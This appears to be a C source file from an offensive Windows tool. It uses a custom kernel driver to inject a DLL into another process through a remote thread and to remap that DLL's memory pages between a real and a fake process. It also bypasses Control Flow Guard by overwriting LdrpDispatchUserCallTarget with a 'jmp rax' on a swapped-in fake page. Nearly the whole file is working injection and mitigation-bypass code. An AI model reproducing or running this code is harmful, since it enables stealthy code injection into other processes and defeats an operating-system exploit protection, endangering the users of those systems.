#include "../inc/drvutils.h"

int CreateRemappableThread(HANDLE proc, PVOID startpoint, PVOID dllbase) {
	HANDLE DrvHandle = CreateFileW(DRV_STANDARD_HANDLE, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	puts("[+] creating remappable thread");

	if (DrvHandle == INVALID_HANDLE_VALUE) {
		puts("[!] error initializing remappable pages");
		return 2;
	}

	// first enable the actual hook
	NTSTATUS Status = DeviceIoControl(DrvHandle, CTL_ENABLEGLOBALHOOK, 0, 0, 0, 0, 0, (LPOVERLAPPED)NULL);
	Status = Status & 0xc0000000;
	if (Status) {
		puts("[!] error enabling hook");
	}

	puts("[+] enabled hook");

	DWORD nThreadId = 0;
	if (CreateRemoteThread(proc, 0, 0, (LPTHREAD_START_ROUTINE)dllbase, startpoint, CREATE_SUSPENDED, &nThreadId) == 0) {
		puts("[!] remote thread creation failed");
		return 0;
	}

	printf("[+] created suspended thread at %p\n", startpoint);

	HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, nThreadId);
	INT64 threadBuf = nThreadId;
	if (hThread == 0) {
		puts("[!] thread handle error");
		return 0;
	}

	Status = DeviceIoControl(DrvHandle, CTL_ADDBYIDTHREAD, &threadBuf, sizeof(INT64), 0, 0, 0, (LPOVERLAPPED)NULL);
	Status = Status & 0xc0000000;
	if (Status) {
		puts("[!] error adding thread to remap list");
	}

	puts("[+] resuming thread");
	ResumeThread(hThread);

	puts("[i] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
	puts("[i] !!!            DO NOT CLOSE THIS WINDOW            !!!");
	puts("[i] !!! INJECTED DLL IS IN THE CONTEXT OF THIS PROCESS !!!");
	puts("[i] !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");

	CloseHandle(hThread);
	CloseHandle(proc);
	CloseHandle(DrvHandle);

	for (;;) {

	}

	return 0;
}

int RemapContiguousReflectedPages(int realproc, int fakeproc, int RemappablePages, PCHAR dllbase) {
	HANDLE DrvHandle = CreateFileW(DRV_STANDARD_HANDLE, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (DrvHandle == INVALID_HANDLE_VALUE) {
		puts("[!] error initializing remappable pages");
		return 2;
	}

	MMREMAP remap = { 0 };

	remap.TProcessId = (HANDLE)realproc;
	remap.SProcessId = (HANDLE)fakeproc;

	for (int i = 0; i != RemappablePages; i++) {
		PCHAR newpage = dllbase + (i * 0x1000);
		remap.TVirtualPage = newpage;
		remap.SVirtualPage = newpage;
		remap.RemapPage = i;
		NTSTATUS Status = DeviceIoControl(DrvHandle, CTL_DEFINENEWRMPAGE, &remap, sizeof(remap), 0, 0, 0, (LPOVERLAPPED)NULL);
		Status = Status & 0xc0000000;
		if (Status) {
			printf("[!] error communicating with driver - code %x\n", Status);
			return 2;
		}
		printf("[+] remappable page %d - %p : OK\n", i, newpage);
	}
	CloseHandle(DrvHandle);
	return 0;
}

NTSTATUS MeDisableCfgForThreadsInProcess(HANDLE realproc) {
	// find base address of LdrpDispatchUserCallTarget
	// patching this function to jmp rax bypasses cfg
	// by using this alongside the page remapper we can patch for only our threads
	puts("[+] attempting to disable control flow guard");
	HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
	if (kernel32 == 0) {
		puts("[!] idk man kernel32 doesnt exist ????");
		return 0xc0000005;
	}

	PCHAR BaseThreadInitThunk = (PCHAR)GetProcAddress(kernel32, "BaseThreadInitThunk");
	if (BaseThreadInitThunk == 0) {
		puts("[!] error");
		return 0xc0000001;
	}

	printf("[+] found BaseThreadInitThunk - %p\n", BaseThreadInitThunk);
	BaseThreadInitThunk += 0x10;
	INT guardIOffset = *(int*)(BaseThreadInitThunk);
	guardIOffset += 0x4;
	PCHAR LdrpDispatchUserCallTarget = *(PVOID*)(BaseThreadInitThunk + guardIOffset);
	PCHAR LdrpDispatchUserCallTargetPage = (PCHAR)((INT64)LdrpDispatchUserCallTarget & 0xfffffffffffff000);

	printf("[+] LdrpDispatchUserCallTarget - %p\n", LdrpDispatchUserCallTarget);
	printf("[+] LdrpDispatchUserCallTarget backing page - %p\n", LdrpDispatchUserCallTargetPage);
	PCHAR fakePage = VirtualAlloc(0, 0x1000, MEM_COMMIT, PAGE_READWRITE);							// ok i leak this memory. i do not care because the os tracks it for me
	int offsetfrompage = (int)(LdrpDispatchUserCallTarget - LdrpDispatchUserCallTargetPage);

	if (fakePage == 0) {
		puts("[!] cannot allocate memory");
		return 0xc0000001;
	}

	memcpy(fakePage, LdrpDispatchUserCallTargetPage, 0x1000);
	fakePage[offsetfrompage] = 			0xff; // jmp [rax]
	fakePage[offsetfrompage + 0x1] = 	0xe0;
	puts("[+] fake page setup. creating remap");

	HANDLE DrvHandle = CreateFileW(DRV_STANDARD_HANDLE, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (DrvHandle == INVALID_HANDLE_VALUE) {
		puts("[!] error initializing remappable pages");
		return 0xc0000001;
	}

	MMREMAP remap = { 0 };
	remap.TProcessId = (HANDLE)realproc;
	remap.SProcessId = (HANDLE)GetCurrentProcessId();
	remap.TVirtualPage = LdrpDispatchUserCallTargetPage;
	remap.SVirtualPage = fakePage;
	remap.RemapPage = AMT_REMAPPABLE_PG - 1;
	NTSTATUS Status = DeviceIoControl(DrvHandle, CTL_DEFINENEWRMPAGE, &remap, sizeof(remap), 0, 0, 0, (LPOVERLAPPED)NULL);
	Status = Status & 0xc0000000;

	if (Status) {
		printf("[!] error communicating with driver - code %x\n", Status);
		return 0xc0000001;
	}

	printf("[+] remappable page %p : OK\n", LdrpDispatchUserCallTargetPage);
	CloseHandle(DrvHandle);
	return 0;
}